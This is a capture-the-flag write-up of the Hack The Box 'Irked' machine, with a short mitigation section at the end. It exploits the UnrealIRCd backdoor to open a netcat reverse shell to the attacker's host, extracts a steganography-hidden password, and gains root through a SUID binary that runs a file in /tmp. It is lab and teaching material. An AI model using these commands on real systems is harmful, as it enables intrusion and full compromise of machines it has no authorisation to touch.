# Irked

```
kali@kali:~/htb/Irked$ sudo nmap -p- -sC -sV 10.129.1.108
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 20:12 EST
Nmap scan report for 10.129.1.108
Host is up (0.026s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33362/tcp6  status
|   100024  1          33605/udp   status
|   100024  1          45480/udp6  status
|_  100024  1          51707/tcp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
51707/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.72 seconds
kali@kali:~/htb/Irked$ 

```

Going to the webpage reveals an image of a sad smiley, and the text: "IRC is almost working!"

So let's check out UnrealIRCd

```
kali@kali:~/htb/Irked$ searchsploit UnrealIRCd
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                 | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                      | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                               | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                    | windows/dos/27407.pl
------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Irked$ 
```

I examine both the linux exploits and see that both take use of sending "AB;" followed by the payload. 

So could we could use this to send any command we want. 

Let's try it out:


First I connect with nc.

```
kali@kali:~/htb/Irked$ sudo nc 10.129.1.108 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB; ping 10.10.14.70 -c 1
:irked.htb 451 AB; :You have not registered
```

And to check that we recieved the ping:

```
kali@kali:~/htb/Irked$ sudo tcpdump -i tun0 icmp -v
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
20:37:25.486514 IP (tos 0x0, ttl 63, id 14795, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.1.108 > 10.10.14.70: ICMP echo request, id 4768, seq 1, length 64
20:37:25.486534 IP (tos 0x0, ttl 64, id 3204, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.70 > 10.129.1.108: ICMP echo reply, id 4768, seq 1, length 64
```

So we got code execution. Let's try to connect back:

```
kali@kali:~/htb/Irked$ sudo nc 10.129.1.108 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB; nc 10.10.14.70 1337 -e /bin/bash
```

and on our listener:

```
kali@kali:~/htb/Irked$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.1.108 41165
whoami
ircd
```

I then elevate the shell with: `script /dev/null -c bash`. ctrl+z, `stty raw -echo`, `fg`, `reset`, `xterm`, `export TERM=xterm`, `export SHELL=bash`

I find the ircd home folder and check the bash history:

```
ircd@irked:~$ cat .bash_history 
ls
cat aliases
lskeys
ls keys
ls keys/CVS
cd keys
ls
file CVS
cd CVS
ls
ls Root
cat Root/Root
cd Root
ls
file Root
cat Root
cd /
ls
cd /home
ls
cd djmardov
ls
ls *
cd /tmp
ls
clear
clear
ls
cd /
ls
cd /var/www/html
ls
cd /tmp
sudo -i
cd /home/ircd
clear
ls
ls -lah
cd ..
ls
cd djmardov
ls
cd Documents
ls -lah
cat .backup
clear
exit
ircd@irked:~$ 
```

So I check out the .backup file:

```
ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
ircd@irked:/home/djmardov/Documents$ 
```

This is a reference to the famous "konami code". And does not work as a password straight up. But we get another hint. Super elite steg. This is possibly in reference to steganograpy. 

We do have an image from the webpage.

I download it with wget, and take a look. Nothing with binwalk, zsteg does not work since it is not a png. I don't have stegsolve on the VM currently, so I'd rather wait with that until I can't do anything else.

So steghide it is, we do have a password after all. I did wonder if the konami-code would be used in stegsolve to move it around, but steghide worked:

```
kali@kali:~/htb/Irked$ steghide info irked.jpg -p UPupDOWNdownLRlrBAbaSSss
"irked.jpg":
  format: jpeg
  capacity: 1.5 KB
  embedded file "pass.txt":
    size: 17.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
kali@kali:~/htb/Irked$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
wrote extracted data to "pass.txt".
kali@kali:~/htb/Irked$ cat pass.txt 
Kab6h+m+bbp2J:HG
kali@kali:~/htb/Irked$ 
```

And we get the user:

```
ircd@irked:/home/djmardov/Documents$ su -l djmardov
Password: 
djmardov@irked:~$ whoami
djmardov
djmardov@irked:~$ 
```

I want to try to find the privesc without using LinEnum this time. So I'm gonna look up some manual commands I can use for enumeration.

I run a couple commands until I find this:

```
djmardov@irked:/$ find / -perm -u=s -type f 2>/dev/null  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
djmardov@irked:/$ 
```

These are all the suid applications. So applications that run as the owner, not the user.

"/usr/bin/viewuser" catches my eye as a potential target, so I go and take a look.


```
djmardov@irked:/$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-02-06 02:28 (:0)
sh: 1: /tmp/listusers: not found
djmardov@irked:/$ 
```

I do remember from the bash_history, that /tmp was frequently visited. 

And it looks like the binary is reading a file. So let's create the file and see what happens.

```
djmardov@irked:/tmp$ touch listusers
djmardov@irked:/tmp$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-02-06 02:28 (:0)
sh: 1: /tmp/listusers: Permission denied
djmardov@irked:/tmp$ chmod 777 listusers
djmardov@irked:/tmp$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-02-06 02:28 (:0)
djmardov@irked:/tmp$ 
```

note that I had to make it executable for the program to run it. So maybe we can throw some code in there.


```
#!bin/bash

chmod 4755 /bin/bash
```

And then run it:

```
djmardov@irked:/tmp$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-02-06 02:28 (:0)
djmardov@irked:/tmp$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# 
```

## Comparing myself with the official writeup:

They use metasploit to exploit the UnrealIRCd backdoor.

They ssh in after finding the password in the image file.

They use a similar command to find suid files.

They use ltrace to examine the binary.

They gain root by creating a listusers file with "/bin/sh".



## How to stop this exploit:

Looking at https://lwn.net/Articles/392201/

We can see that the backdoor is disguised as a variable called DEBUGMODE3_INFO.

It was patched, and updated versions of unrealIRCd do not have the backdoor.

Having the users password hidden in an image file is also not secure at all. Neither is saving the password for that file in a file called .backup.

viewuser could also be achieved with already built-in commands in the linux system. Which would not be susceptible to privelege escalation.
